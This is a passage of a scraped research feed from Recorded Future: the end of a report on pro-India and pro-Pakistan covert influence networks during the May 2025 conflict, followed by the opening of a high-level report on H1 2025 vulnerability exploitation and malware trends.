emphasized technological superiority and weapon precision to support public perceptions of tactical restraint. They did this by promoting each respective country’s weapons’ effectiveness while discrediting the other country’s systems in an attempt to paint retaliatory strikes as disproportionate and indiscriminate. Accounts consistently highlighted the precision of their respective country’s military attacks, as well as any civilian casualties inflicted by the adversary, by sharing images and footage of military strikes, likely to complicate battle damage assessments and downplay the impact of the other country’s actions, while appealing to international audiences and strengthening patriotic sentiment domestically.\nFigure 42: Increased operational tempo by both networks following kinetic escalation (Source: Recorded Future)\nInitial Escalation and Retaliatory Framing\nPrior to the launch of Operation Sindoor, both networks documented rising military escalation along the LoC in J&K. They also framed the military maneuvers of each other’s respective country as provocations, while establishing such maneuvers as a clear justification for the other country’s retaliation.\nBoth networks also made claims and counterclaims concerning shows of strength along the LoC. For example, Hidden Charkha accounts called Pakistan’s May 3, 2025, Abdali missile tests an attempt to “divert attention from its role in the Pahalgam massacre.\" Meanwhile, very likely inauthentic images shared by Khyber Defender (Figures 43 and 44) attempted to justify military retaliation and deter further escalation by posting images with captions such as “We dare you” and “Pakistan will retaliate disproportionately.” Khyber Defender also documented the Pakistani Army shooting down Indian Unmanned Aerial Vehicles (UAVs) and criticized Indian Rafale sweeps along the LoC.\nFigures 43 and 44: Images shared by Khyber Defender prior to Operation Sindoor\n(Source: Recorded Future, Social Media)\nAs soon as April 24, 2025, Khyber Defender accounts began repeatedly posting content attempting to establish a red line for kinetic escalation (using the hashtag #pakistanismyredline) and lauding its military preparedness, praising the Pakistani Air Force (PAF) using hashtags like #pafreadytorespond. The network also shared AI-generated images (Figures 45 and 46), which were likely made using OpenAI’s GPT-4o (based on the model’s distinct “sepia” or “yellow-tint” style also found in these images), showing military preparedness, such as portraying Pakistani F-16s in the style of traditional wartime propaganda. Khyber Defender accounts also began amplifying narratives of the Pakistani armed forces’ technological superiority early in the conflict, stating, for example, that Pakistani JF-17s “outclass” India’s “vintage MiGs,” and that “Our AWACS & missile tech ensure dominance. No propaganda can hide this asymmetry.”\nFigures 45 and 46: AI-generated images shared by Khyber Defender\n(Source: Recorded Future)\nResponses to Operation Sindoor\nFollowing the Indian military’s launch of “Operation Sindoor” on May 7, 2025, Hidden Charkha accounts increased their operational tempo to justify military action, amplify and often exaggerate Indian military successes, discredit Pakistani counter-narratives, and generally celebrate the operation as a success.\nHidden Charkha praised the Indian Armed Forces’ military capabilities and coordination, demonstrating intimate knowledge of India’s military capabilities after years of posting content praising India’s defense systems. Starting May 7, 2025, the network lauded the effectiveness of India’s Akash and SCALP missiles, Dassault Rafale fighter jets, and Bofors L-70 and Zu-23mm anti-aircraft guns. The network also issued strong denials to counter initial Pakistani media reports that Pakistani forces shot down Indian Rafales. The network also highlighted Pakistan’s loss of military equipment. On May 8, 2025, Hidden Charkha began posting claims that Indian S-400 air defense systems had downed two Pakistani JF-17s and a J-20C. The network later amplified reports of Pakistani equipment being destroyed, such as an AWACS aircraft and an F-16 squadron at Bholari airbase and Shapar and Bayraktar drones at Murid airbase, in addition to claiming that Chinese-made missiles, such as PL-15 and HQ-9 air-to-air missiles, were ineffective (Figure 47).\nFigures 47 and 48: Images shared by Hidden Charkha covering Operation Sindoor (Source: Recorded Future)\nFollowing Operation Sindoor, Hidden Charkha amplified narratives painting the military operation as a justified escalation and proportional response to the Pahalgam attack. On May 12, 2025, Hidden Charkha accounts amplified graphics posted by the Indian Ministry of Defense (MoD) Additional Directorate General of Public Information (ADG-PI) on social media, with accounts claiming that “India showed exemplary Strategic Restraint. #OperationSindoor was powerful yet measured, targeting only terror infrastructures, avoiding escalation.” Other accounts posted content claiming that Operation Sindoor had international approval, including sharing graphics originally from Indian news outlets that claimed US Secretary of Defense Pete Hegseth “backed” Operation Sindoor (Figure 49), as well as Afghanistan’s former Vice President Amrullah Saleh (Figure 50). Hidden Charkha likely attempted to amplify nationalist sentiment during Operation Sindoor by consistently using the hashtags #pahalgamavenged and #satyamevjayate, with the latter being India’s official national motto (“truth alone triumphs”).\nFigures 49 and 50: Graphics published by Hidden Charkha accounts justifying Operation Sindoor\n(Source: Recorded Future)\nIn line with the network’s previous aggressive stance toward international media, at least one account posted an attempted community note in response to French media outlet France24, claiming that its reporting attempted to “protect the reputation of China’s rotten and outdated weapons.” On May 20, 2025, Hidden Charkha accounts posted content celebrating Operation Sindoor as a success, dubbing a BJP rally in Baramulla (located in India-controlled J&K) a “shining moment of unity, patriotism, and victory,” very likely attempting to reinforce patriotic narratives among audiences in contested regions.\nDuring the early stages of Operation Sindoor, Khyber Defender accounts very likely attempted to capitalize on Pakistan’s alleged downing of Rafales and Israeli drones to spring counter-claims undermining Indian narratives of technological superiority (calling India’s claims “big talk” and a “bluff”) and attract international attention to the conflict. Starting May 7, 2025, Khyber Defender began posting content covering the reported downing of Indian Rafales by the PAF using PL-15 missiles (Figure 51), as well as amplified alleged imagery of the wreckage. On May 9, 2025, Khyber Defender accounts claimed that India’s loss of Rafale fighter jets had “sparked disbelief and mockery in French media” (Figure 52).\nFigures 51 and 52: Khyber Defender content covering the reported Rafale downings by the PAF on May 7–9, 2025\n(Source: Recorded Future)\nResponses to Operation Bunyan-Al-Marsous\nFollowing initial counter-claims to India’s Operation Sindoor, Khyber Defender pivoted to promoting Pakistan’s Operation Bunyan-Al-Marsous beginning on May 10, 2025. Similar to Hidden Charkha, Khyber Defender also attempted to exaggerate the PAF’s operational success and amplify nationalist sentiment (Figures 53 and 54), naming the operation “a symbol of national resolve and unmatched defense capability.” On May 10, 2025, the network claimed that PAF JF-17s had successfully “neutralized” an Indian S-400 using hypersonic missiles.\nFigures 53 and 54: Khyber Defender content promoting Operation Bunyan-Al-Marsous (Source: Recorded Future)\nSimilar to Hidden Charkha, Khyber Defender accounts also amplified images and footage of alleged destruction of Indian military installations (Figures 55 and 56) to demonstrate precise strikes and tactical restraint, including purported footage showing the destruction of Indian Brahmos missile storage units in Beas and Nagrota. On May 10, 2025, Khyber Defender accounts also promoted the success of Fatah missiles in posts that allegedly revealed the “destruction of key Indian facilities.”\nFigures 55 and 56: Footage of Pakistani missile strikes shared by Khyber Defender accounts (Source: Recorded Future)\nOn May 11, 2025, Hidden Charkha accounts attempted to paint Pakistan’s actions as indiscriminate, accusing Pakistan of shelling and killing civilians in Poonch, J&K province, on May 8, 2025. Accounts posted AI-generated images containing slogans like “All Eyes on Poonch” (reusing international slogans like “All Eyes on Rafah” in the Israel-Gaza conflict), as seen in Figures 57 and 58, almost certainly to appeal to international audiences and call for the suspension of international aid to Pakistan by using the hashtag #frombeggingtobombing (Figure 59). Pakistan Prime Minister Shehbaz Sharif announced in January 2025 that the country would receive $20 billion in loans from the World Bank over the coming decade, making this substantial financial aid a likely target of pro-Indian influence narratives.\nFigures 57, 58, and 59: AI-generated images posted by Hidden Charkha accounts on May 11, 2025\n(Source: Recorded Future)\nSupporting Cyber Escalation\nInsikt Group observed limited instances of Hidden Charkha and Khyber Defender amplifying claims of cyber attacks targeting India and Pakistan by hacktivist and state-sponsored threat actors following the Pahalgam attack. These networks almost certainly attempted to amplify the effectiveness and impact of hacktivist and state-sponsored cyberattacks to strengthen nationalist sentiment in the midst of kinetic escalation between the two countries, but often amplified unconfirmed claims by national media outlets and low-credibility hacktivist groups.\nBoth networks included unconfirmed claims on social media as part of their posts. On May 6, 2025, Hidden Charkha accounts amplified Indian Cyber Force (ICF)’s unconfirmed claims on social media that the hacktivist group had compromised “over 1,000+ cameras” in Pakistan, allegedly gaining access to surveillance footage in government facilities, industrial zones, private corporations, schools, and banks. One Hidden Charkha account amplifying the video lauded “Indian hackers' precision” while stating that “when you plot terror, expect cyber firepower!” likely in an attempt to capitalize on ICF’s claims to amplify nationalist sentiment (Figure 60).\nFigure 60: Hidden Charkha post amplifying a video from Indian Cyber Force claiming to have compromised surveillance cameras in Pakistan (Source: Recorded Future)\nKhyber Defender accounts also almost certainly attempted to amplify unconfirmed claims of cyber attacks on Indian government infrastructure. On May 10, 2025, Khyber Defender accounts posted screenshots depicting a defaced website affiliated with the BJP alongside text stating that the website had been compromised by the PAF’s “Cyber Force” (likely in reference to the PAF’s Cyber Command) as part of Operation Bunyan-Al-Marsous (Figure 61). One account also very likely attempted to exaggerate the effects of cyberattacks by claiming, for example, that “India’s cyber core” (Figure 62) and “70% of [India’s] Northern grid” had been compromised, using hashtags like #infrastructureblackout, #griddownindia, #scadahacked, #powercollapse, and #logisticsparalyzed. The claim likely refers to unconfirmed reports by Pakistani media that Pakistani armed forces had compromised Maharashtra State Electricity Transmission Company (MAHATRANSCO), a major state-owned electricity transmission company. Khyber Defender accounts also claimed successful cyberattacks against Hindustan Aeronautics Limited, the Unique Identification Authority of India (UIDAI), the IAF, and the Election Commission of Maharashtra. The attacks remain unconfirmed in their scope and impact.\nFigures 61 and 62: Khyber Defender content amplifying data breaches targeting the Indian government\n(Source: Recorded Future)\nCeasefire and Aftermath\nAs conventional kinetic operations escalated between May 7 and 10, 2025, members of the international community sought to intervene in an effort to reduce tensions and encourage restraint. On May 10, 2025, India and Pakistan announced a US-brokered ceasefire, shortly after the beginning of Pakistan’s Operation Bunyan-Al-Marsous. As the ceasefire took hold, Hidden Charkha greatly increased its operational tempo, and Khyber Defender maintained the operational tempo seen during the kinetic escalation phases of the conflict. Both networks attempted to rapidly establish narratives promoting India and Pakistan’s respective military successes and technological sophistication and to undermine either India or Pakistan on the global stage. Both networks also promoted the #ceasefireviolation hashtag in the immediate days following the announcement to accuse either India or Pakistan of violating the agreement, echoing similar accusations made by both governments.\nBoth Hidden Charkha and Khyber Defender attempted to exploit the US’s diplomatic intervention in brokering the ceasefire agreement to further undermine India's or Pakistan’s international and diplomatic credibility. Hidden Charkha accounts accused Pakistan of asking the US to broker the ceasefire in the face of mounting military failures, while attempting to gauge Indian social media users’ sentiment on the ceasefire (Figure 63). Meanwhile, Khyber Defender praised US President Donald Trump for brokering the agreement, calling for him to receive a Nobel Peace Prize (using hashtags like #trumpfornobel and #trump_nobel_peace), as seen in Figure 64. Khyber Defender accounts also accused India’s “elites” of “mocking” and “ridiculing” Trump’s ceasefire (which allegedly shows their intent to prolong the conflict), while the pro-Pakistani network likely attempted to curry favor with the US president.\nFigures 63 and 64: Hidden Charkha (left) and Khyber Defender (right) content following the announcement of a US-brokered ceasefire agreement (Source: Recorded Future)\nDespite the ceasefire agreement, both Hidden Charkha and Khyber Defender continued attempting to assert the technological superiority of India and Pakistan, respectively, and used the conflict’s aftermath as proof of the other country’s relative lack of military sophistication. Hidden Charkha accounts reported that Chinese defense companies’ stock prices fell following the ceasefire after promoting narratives questioning the effectiveness of Chinese-made equipment used by Pakistan’s armed forces, such as PL-15 missiles, which were made by Zhuzhou Hongda Electronics (Figure 65), and J-10 fighter jets, which were made by AVIC Chengdu (Figure 66). Meanwhile, Khyber Defender accounts amplified a speech by Pakistani PM Shehbaz Sharif to state that “the Air Force’s use of modern technology sent a lasting warning the adversary will remember for generations” and attempted to undermine confidence in Rafale jets made by French company Dassault Aviation (Figure 67).\nFigures 65 and 66: Screenshot of Chinese defense stocks following the ceasefire announcement posted by Hidden Charkha accounts (Source: Recorded Future)\nFigure 67: Image shared by Khyber Defender accounts attempting to ridicule Indian Rafale jets\n(Source: Recorded Future)\nMitigations\nCustomers can use the following queries to monitor Hidden Charkha and Khyber Defender activity, leveraging Recorded Future AI to summarize and track emerging narratives.\nBusinesses operating in India and Pakistan should monitor ongoing influence narratives to understand national sentiment on major political and geopolitical issues, and track narratives perpetuated by CIB networks to measure attempts at managing conflict escalation.\nInternational news media outlets covering emerging conflicts should monitor influence content from known influence networks attempting to abuse their brand. Such abuse increases reputational risks and erodes consumer trust, potentially deterring advertisers and inflicting financial harm on the impersonated organizations.\nGovernments tracking regional conflicts should monitor local and regional influence networks to track amplified narratives supporting conflict escalation during kinetic combat operations. Understanding influence networks’ TTPs and narratives increases governments’ resilience against the convergence of geopolitical, cyber, and influence threats.\nOutlook\nHidden Charkha and Khyber Defender will almost certainly continue operating in alignment with the domestic and foreign policy objectives of the Indian and Pakistani governments, respectively. While Insikt Group was unable to determine the exact degree of state control or affiliation with these networks, we assess that patriotic sentiment will remain an important driver in aligning future campaigns with their governments, even if these networks are operated by non-state-sponsored threat actors.\nShould a new kinetic conflict emerge between India and Pakistan, we expect these networks to resume the operational tempo observed during the standoff in April and May 2025, which amounted to over 1,000 posts daily at its peak. The networks will almost certainly continue amplifying narratives and content from national media outlets and government PR entities, in addition to opportunistically amplifying and exaggerating misleading claims and forged documents seeded by prominent social media accounts and hacktivist groups. While the networks were almost certainly unsuccessful in shaping domestic or international public opinion, the adoption of new procedures, such as using generative AI to generate original text and visual content, will likely help these networks cross language barriers and design consistent, more engaging content.\nAt a more strategic level, Hidden Charkha and Khyber Defender’s activity during an escalating kinetic conflict demonstrates the potential role of covert influence networks in inflating operational success, strengthening national cohesion, and establishing a moral high ground to frame conventional kinetic actions as justified defensive operations. Influence networks can help reinforce perceptions of technological superiority and precise military capabilities by demonstrating each state’s ability to conduct restrained, proportional strikes, which is almost certainly necessary for maintaining international credibility and diplomatic support. Conversely, covert influence networks will also likely be used to undermine adversary narratives concerning tactical outcomes (such as airstrikes or downing enemy aircraft), cloud the online information environment, complicate battle damage assessment, and counter attribution claims on terrorist attacks.","enclosure":{"length":"0","type":"image/jpg","url":"https://www.recordedfuture.com/research/media_11e62bf4b9ecc790fe2f0609ba8f3f18d5702420e.gif?width=1200&format=pjpg&optimize=medium"},"content":"Insikt Group exposes pro-India and pro-Pakistan influence networks active during the 2025 conflict, revealing their tactics, narratives, and strategic objectives.","contentSnippet":"Insikt Group exposes pro-India and pro-Pakistan influence networks active during the 2025 conflict, revealing their tactics, narratives, and strategic objectives.","guid":"https://www.recordedfuture.com/research/influence-operations-and-conflict-escalation-in-south-asia","categories":["Research (Insikt)"],"isoDate":"1970-01-21T07:59:31.000Z","tag":"intel"},{"title":"H1 2025 Malware and Vulnerability Trends","link":"https://www.recordedfuture.com/research/h1-2025-malware-and-vulnerability-trends","pubDate":"Wed, 21 Jan 1970 07:52:19 GMT","content:encoded":"\n      <div>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1229ac62a846d9b9e83d22ef5dd13ebbcc99bbc6a.gif?width=750&amp;format=gif&amp;optimize=medium\" width=\"1600\" height=\"600\" />\n            </div>\n          </div>\n          <div>\n            <div>\n              <h1>H1 2025 Malware and Vulnerability Trends</h1>\n            </div>\n          </div>\n        </div>\n      </div>\n      <div></div>\n      <div>\n        <h2>Executive Summary</h2>\n        <p>The first half of 2025 (H1 2025) reflected a rapidly evolving threat landscape defined by the convergence of persistent legacy threats and advanced new tactics.</p>\n        <p>The total disclosed CVEs increased by 16% from H1 2024, and threat actors exploited 161 vulnerabilities with assigned CVEs, with nearly half linked to malware or ransomware campaigns. Microsoft remained the most targeted vendor, while edge security and gateway devices continued to be high-value targets for initial access. Malware activity was similarly dynamic: while law enforcement takedowns disrupted major players like LummaC2, a resurgence of legacy malware such as Sality indicated that old tools still offer utility for modern actors. Remote access trojans (RATs) like AsyncRAT, XWorm, and Remcos also gained prominence, marking a tactical shift away from the previous dominance of dedicated information stealers (infostealers) in <a href=\"https://www.recordedfuture.com/research/h1-2024-malware-and-vulnerability-trends-report\">H1 2024</a> toward more versatile tools that combine data theft capabilities with persistent, hands-on access.</p>\n        <p>Mobile malware threats continued to grow in H1 2025, with Android banking trojans adopting virtualization-based overlays and near-field communication (NFC) relay attacks to bypass user defenses and enable real-world financial fraud. These innovations reflect a growing trend in financial fraud toward mobile-first exploitation targeting both app and payment ecosystems. Ransomware groups, meanwhile, leaned further into affiliate-driven models, offering ready-made payloads and infrastructure to lower barriers for new entrants. Some ransomware families introduced stealth features such as protected payloads or novel loaders designed to evade endpoint detection. Meanwhile, Magecart skimming campaigns adopted multi-stage, modular infection chains and innovative obfuscation techniques to evade content security policies and inject malicious scripts only during critical moments like checkout.</p>\n        <p>Taken together, H1 2025 underscores that the threat landscape is not only expanding but fragmenting, with threat actors exploiting both novel and legacy tools across diverse attack surfaces. To respond effectively, organizations should prioritize patching of internet-facing systems, particularly gateway and edge security products, which are frequently targeted for initial access. Detection capabilities must extend beyond endpoint telemetry to include behavioral monitoring, command-and-control (C2) traffic analysis, and script obfuscation detection in web environments. Investment in threat intelligence is essential for staying ahead of rapidly changing tactics, such as malware repackaging. Organizations should also revisit mobile device policies and strengthen application vetting and user awareness to counter increasingly sophisticated mobile malware campaigns.</p>\n        <h2>Key Findings</h2>\n        <ul>\n          <li>CVE disclosures increased 16% compared to H1 2024, with 161 of those vulnerabilities actively exploited in H1 2025. Of those, 42% had a public proof-of-concept (PoC) exploit, nearly 69% required no authentication, and 30% enabled remote code execution (RCE), underscoring attackers’ preference for low-friction, high-impact exploits. Microsoft and edge-gateway appliances each made up 17% of exploits, and more than half of the attributed exploitations were state-sponsored, highlighting state-sponsored threat actors’ high capabilities to weaponize flaws quickly.</li>\n          <li>Based on Recorded Future Triage submissions and Insikt Group reporting, Command and Control (TA0011) was the most frequently observed malware tactic, with over 194,000 detections. Top techniques (according to the <a href=\"https://attack.mitre.org/\">MITRE ATT&amp;CK matrix</a>) included data encrypted for impact (T1486), valid accounts (T1078), and data from local systems (T1005), emphasizing the prevalence of ransomware deployment and the importance of persistent access to obtain and exploit sensitive data.</li>\n          <li>The mobile threat landscape continued to evolve during the first half of 2025, marked by the discovery of eleven new mobile malware strains and the resurgence or continued operation of nine others. This included banking trojans, infostealers, spyware, and RATs. Long-standing tactics, techniques, and procedures (TTPs) like overlay attacks remained common, though with some innovation.</li>\n          <li>Threats to contactless payments increased, as evidenced by the discovery of SuperCard X, a Chinese MaaS platform that enables NFC relay fraud by capturing and transmitting contactless card data to attacker-controlled devices.</li>\n          <li>Ransomware threat actors adopted new TTPs across the attack chain during the first half of 2025. This included ClickFix-based social engineering for initial access, endpoint detection and response (EDR) evasion via bring-your-own-installer (BYOI) techniques, and custom payloads using just-in-time (JIT) hooking and memory injection to bypass detection. Ransomware threat actors also continued to use legitimate tools for persistence, data theft, and stealthy C2, including AnyDesk to maintain access, Syteca for keylogging, and GC2 for cloud-based C2.</li>\n        </ul>\n        <h2>Vulnerability Exploitation Trends</h2>\n        <h3>Key Takeaways</h3>\n        <ul>\n          <li>23,667 CVEs were published in H1 2025, a 16% increase compared to H1 2024. Attackers actively exploited 161 vulnerabilities, and 42% of those exploited flaws had public PoC exploits. 21 out of the 27 Nuclei templates published by Insikt Group corresponded to vulnerabilities that appear in the US Cybersecurity and Infrastructure Security Agency (CISA) Known Exploited Vulnerabilities (KEV) catalog.</li>\n          <li>Microsoft products accounted for 17% of such exploitations, but attackers also concentrated on edge‑security and gateway appliances such as SSL‑VPNs and next-gen firewalls (similarly 17%), whose position at the network perimeter makes them attractive entry points for attacks that can later propagate through downstream supply chains.</li>\n          <li>69% of exploited vulnerabilities did not require authentication, and nearly one-third enabled RCE. 151 exploited vulnerabilities were used to deploy malware and 73 to launch ransomware, with backdoors the most common payload.  State-sponsored actors drove more than half of the attributed exploitation, highlighting the significant strategic drivers of such attacks, as well as such actors’ capabilities to weaponize flaws shortly after disclosure.</li>\n        </ul>\n        <h3>Microsoft Leads Actively Exploited Vulnerabilities as Total Disclosed Vulnerabilities Rise Compared to 2024</h3>\n        <p>In the first half of 2025, the volume of disclosed vulnerabilities continued to climb. The total number of CVEs increased by 16% compared to H1 2024, rising from 20,385 in H1 2024 to 23,667 in H1 2025. This growth suggests an expanding attack surface and more opportunities for threat actors to find exploitable flaws. Notably, the most common vulnerability types by weakness were web application issues: <a href=\"https://cwe.mitre.org/data/definitions/79.html\">Cross-Site Scripting (CWE-79)</a> and <a href=\"https://cwe.mitre.org/data/definitions/89.html\">SQL Injection (CWE-89)</a> represented the highest share of weaknesses, followed by <a href=\"https://cwe.mitre.org/data/definitions/352.html\">Cross-Site Request Forgery (CWE-352)</a>, generic <a href=\"https://cwe.mitre.org/data/definitions/74.html\">Injection flaws (CWE-74)</a>, and <a href=\"https://cwe.mitre.org/data/definitions/862.html\">Missing Authorization (CWE-862)</a>. This highlights that fundamental security gaps in web applications remain widespread, and organizations should heed these trends; the persistence of injection and scripting weaknesses means attackers will continue to find easy targets in poorly secured web interfaces.</p>\n        <p>When looking at actively exploited vulnerabilities in H1 2025, Microsoft products dominated the field. Microsoft accounted for the highest number of actively exploited CVEs with 28 (see <strong>Figure 1</strong>), of which twenty targeted Windows specifically. This tally was more than triple that of the next most targeted vendors: Apple (eight), Ivanti (seven), and Linux (six). The outsized targeting of Microsoft likely reflects the ubiquity of Windows across enterprises; attackers naturally prioritize vulnerabilities in widely deployed systems to maximize potential victims. In total, Insikt Group identified exploited vulnerabilities affecting 81 distinct vendors. This breadth indicates that exploitation in the wild is not concentrated on just a few big-name software suites; instead, attackers are casting a wide net.</p>\n        <p>Attackers continue to opportunistically probe less common software and environments, likely perceiving that organizations may delay patches or have limited monitoring on those systems, making them softer targets. For defenders, this means a robust patch management program cannot ignore the long tail of software assets: a vulnerability in a lesser-known product can still be the entry point for a major breach if left unpatched.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_16a45e2f9e154cd426d43abac9c4ed24f8bf004b6.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"986\" />\n            </div>\n          </div>\n          <div>\n            <div><strong>Figure 1:</strong> Top ten vendors (including ties) by number of actively exploited CVEs in H1 2025 (Source: Recorded Future)</div>\n          </div>\n        </div>\n        <p>Another notable trend is the focus on vulnerabilities in the tools designed to keep networks safe. 17% of the actively exploited CVEs affected edge-security and gateway products. This included SSL-VPNs, next-gen firewalls, secure gateways, and remote access portals from vendors such as Ivanti, SonicWall, Fortinet, Palo Alto, Cisco, Citrix, Juniper, and Sophos, as well as virtualization underlays like VMware.</p>\n        <p>Because these appliances terminate VPNs, decrypt traffic, and broker trust between networks, a single exploit instantly grants attackers a privileged, authenticated pathway into an organization’s environment for initial access and lateral movement. For instance, CVE-2025-0282 (Ivanti Connect Secure and Policy Secure) allowed remote, unauthenticated attackers to execute arbitrary code on the appliance and steal credentials for further lateral movement inside the network. This trend underscores that threat actors — including well-resourced state-sponsored groups — are increasingly targeting these security infrastructure platforms to operate with minimal detection. Organizations must harden and promptly patch their network edge devices and monitor them closely, as these systems have become high-value targets that attackers use to bypass traditional defenses and pivot deep into corporate networks.</p>\n        <p>Attackers were observed exploiting 161 distinct vulnerabilities in the first half of 2025, according to Recorded Future data. This exceeds the 136 vulnerabilities listed in CISA’s <a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\">KEV catalog</a> for the same timeframe. In other words, Recorded Future telemetry identified 25 additional exploited CVEs beyond what was publicly recognized by CISA during that period.</p>\n        <p>Of those 161 exploited flaws, 68 (42%) had a publicly available PoC exploit (see <strong>Figure 2</strong>). The availability of a PoC lowers the bar for exploitation, effectively allowing a larger pool of attackers (including less-skilled threat actors) to weaponize the vulnerability. In multiple cases, Insikt Group has observed exploitation activity surge within days or hours of a PoC release. Organizations should therefore implement rapid patching or interim mitigations to limit the window of exposure.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_12179c55f853efd10f4f5fa807a8a44b582c62193.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"460\" />\n            </div>\n          </div>\n          <div>\n            <div><strong>Figure 2:</strong> Actively exploited vulnerabilities with a public PoC exploit, by month (Source: Recorded Future)</div>\n          </div>\n        </div>\n        <p>In terms of access requirements and impact, <strong>Figure 3</strong> shows that 111 (69%) of the 161 vulnerabilities required no authentication to exploit, and 78 (48%) could be exploited remotely over a network (as opposed to requiring local access or user interaction). In other words, this heavy tilt toward unauthenticated, remote exploits means that attacks can be launched directly from the internet against vulnerable hosts, with no credentials or insider access needed.</p>\n        <p>48 (30%) of the exploited CVEs enabled RCE, which often grants an attacker full control over the target system, while another 11 (7%) enabled privilege escalation, which is typically used to gain higher system access. None of the exploited vulnerabilities facilitated lateral movement (exploits that facilitate jumping from one system to another). Given that so many exploited flaws are both remotely exploitable and require no valid user account, organizations must proactively scan and prioritize patching for internet-facing applications and services.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_172846fd72e299bf75ac8d22e764d6ba7643cf146.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"1021\" />\n            </div>\n          </div>\n          <div>\n            <div><strong>Figure 3:</strong> Actively exploited vulnerabilities by impact factors (Source: Recorded Future)</div>\n          </div>\n        </div>\n        <h3>UNC5221 Focuses on Ivanti Products as Cobalt Strike Is Most Frequently Associated with Post-Exploitation Activity</h3>\n        <p>The threat actors exploiting these vulnerabilities range from sophisticated state-sponsored groups to profit-driven cybercriminals, and the data from H1 2025 highlights the significant role of state-sponsored campaigns. In cases where Insikt Group could determine attribution, nearly 53% of the observed exploitation activity was driven by state-sponsored and suspected state-sponsored actors. This illustrates that more than half of the attributed exploitations were strategic in nature and conducted for espionage, surveillance, or other geopolitical objectives.</p>\n        <p>Financially motivated groups (those involved in, for example, theft and fraud and not necessarily linked to ransomware) accounted for 27% of exploitations. Another 20% of exploitation was attributed to ransomware and extortion groups, reinforcing how common it has become for ransomware operators to leverage exploits as an initial access vector to then conduct file-encrypting attacks at scale.</p>\n        <p>This breakdown highlights that both strategic and criminal motivations are driving vulnerability exploitation, with a notable absence of any known hacktivist campaigns; hacktivist collectives are typically motivated by disruption and likely lack the intent and capability to conduct such exploitations.</p>\n        <p>By contrast, the presence of state-sponsored actors at the top underlines that many governments’ cyber units have the resources to weaponize new flaws quickly, often within days of a disclosure. The significant state-sponsored involvement also implies that these threats are not just random or opportunistic but often targeted and persistent campaigns aiming at specific sectors or high-value systems.</p>\n        <p>Geographically, the majority of state-sponsored campaigns were conducted by Chinese state-sponsored actors or suspected China-linked actors. Such groups are known to exploit edge infrastructure and enterprise solutions to establish footholds in target networks, and Insikt Group’s observations in the first half of 2025 reaffirm that. The suspected China-linked group UNC5221 exploited the highest number of vulnerabilities and demonstrated a preference for Ivanti products, targeting Ivanti Endpoint Manager Mobile (EPMM; CVE-2025-4428) and Ivanti Connect Secure and Policy Secure (CVE-2025-22457 and CVE-2025-0282).</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"Chart\" src=\"https://www.recordedfuture.com/media_15321b102eba2c77289033897104b1488c2bf732f.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"946\" />\n            </div>\n          </div>\n          <div>\n            <div><strong>Figure 4:</strong> Vulnerabilities by triggered risk rule, based on Recorded Future data (Source: Recorded Future)</div>\n          </div>\n        </div>\n        <p>Of the 161 exploited vulnerabilities, Recorded Future data shows that 151 were leveraged in some form of malware deployment (see <strong>Figure 4</strong>). Within those, 73 vulnerabilities were specifically tied to ransomware deployments — they were either the initial access point for a ransomware attack or used at some stage in the ransomware kill chain. In practical terms, unpatched vulnerabilities are a common entry point for attackers to introduce malware into a victim’s environment; whether the ultimate payload is a remote access trojan (RAT) or ransomware, the initial step of exploiting a weakness is the same.</p>\n        <p>Insikt Group found that the most commonly observed malware used post-compromise was the offensive security tool Cobalt Strike. Tools such as Cobalt Strike are ideal for gaining a reliable foothold for attackers as they provide a full-featured toolkit to run commands, escalate privileges, and move laterally, while blending in with normal network traffic. After Cobalt Strike, the Vshell RAT was the malware most frequently observed alongside exploitation.</p>\n        <p>Overall, as shown in <strong>Figure 5</strong>, backdoor malware accounted for nearly 23% of all post-exploitation activity. The frequent appearance of backdoors and various trojans means that a single exploit often leads to multi-payload efficiency for attackers: with one vulnerability, they may deploy a backdoor, which then allows them to stage additional tools or eventually deliver ransomware, all from that same initial entry point and without needing to develop custom malware.</p>\n        <p>For defenders, this trend is a reminder to monitor for known post-exploitation tools and behaviors. The presence of Cobalt Strike beacons, for example, should be treated as an immediate high-priority incident, while an unusual use of legitimate admin tools or new services could indicate that a RAT or backdoor is running.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"Chart\" src=\"https://www.recordedfuture.com/media_104e29506ca89a40175813a511c797a58e78058f0.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1468\" height=\"742\" />\n            </div>\n          </div>\n          <div>\n            <div><strong>Figure 5:</strong> Actively exploited vulnerabilities by malware category (Source: Recorded Future)</div>\n          </div>\n        </div>\n        <p>From a tactics and techniques perspective, the patterns of exploitation in the first half of 2025 align with known adversary behaviors in the MITRE ATT&amp;CK framework. The most frequent ATT&amp;CK technique was Exploit Public‑Facing Application (T1190), observed in 73% of actively exploited vulnerabilities. This was followed by Exploitation for Client Execution (T1203) and Exploitation for Privilege Escalation (T1068). These three techniques demonstrate a clear picture of attacker preferences and playbooks. T1190 indicates that attackers are heavily targeting servers and services exposed to the internet (for example, web servers or VPN gateways), which is a direct route into a network.</p>\n        <p>The prevalence of T1203 shows that attackers are also investing in exploits that require user interaction (for example, a malicious email attachment or drive-by download that triggers an exploit on the victim’s end). In these scenarios, the vulnerability may be in a client-side application such as a browser or office document software, and the attacker socially engineers the victim into running the exploit. T1068 underscores that once attackers get a foothold, they often elevate their privileges (for example, going from a normal user to SYSTEM or root). This pattern shows how attackers frequently leverage initial access, execution, and privilege escalation into a single exploit chain, and illustrates how an attacker can go from having no access to domain admin privileges if the right combination of unpatched flaws exists.</p>\n        <p>Internet-facing systems and unpatched client software will remain prime targets, and failing to patch those creates an avenue for attackers to get in and escalate their privileges. Defenders should ensure both their perimeter systems and endpoint applications are up to date, and have monitoring in place for exploit attempts.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"Chart\" 